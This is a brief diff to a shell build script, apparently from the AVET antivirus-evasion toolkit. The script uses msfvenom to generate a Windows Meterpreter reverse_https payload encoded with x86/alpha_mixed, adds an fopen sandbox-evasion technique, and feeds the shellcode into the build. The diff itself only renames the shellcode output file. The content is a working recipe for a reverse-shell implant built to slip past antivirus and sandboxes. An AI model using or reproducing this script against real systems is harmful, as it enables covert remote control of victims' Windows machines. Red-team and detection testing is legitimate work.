@@ -18,13 +18,13 @@ LHOST=$GLOBAL_LHOST
 
 # make meterpreter reverse payload, encoded with msf alpha_mixed 
 # additionaly to the avet encoder, further encoding should be used
-msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed -f c -a x86 --platform Windows > input/sc.txt
+msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed -f c -a x86 --platform Windows > input/sc_c.txt
 
 # add fopen sandbox evasion
 add_evasion fopen_sandbox_evasion
 
 # set shellcode source
-set_shellcode_source static_from_file input/sc.txt
+set_shellcode_source static_from_file input/sc_c.txt
 
 # set decoder and key source
 set_decoder none
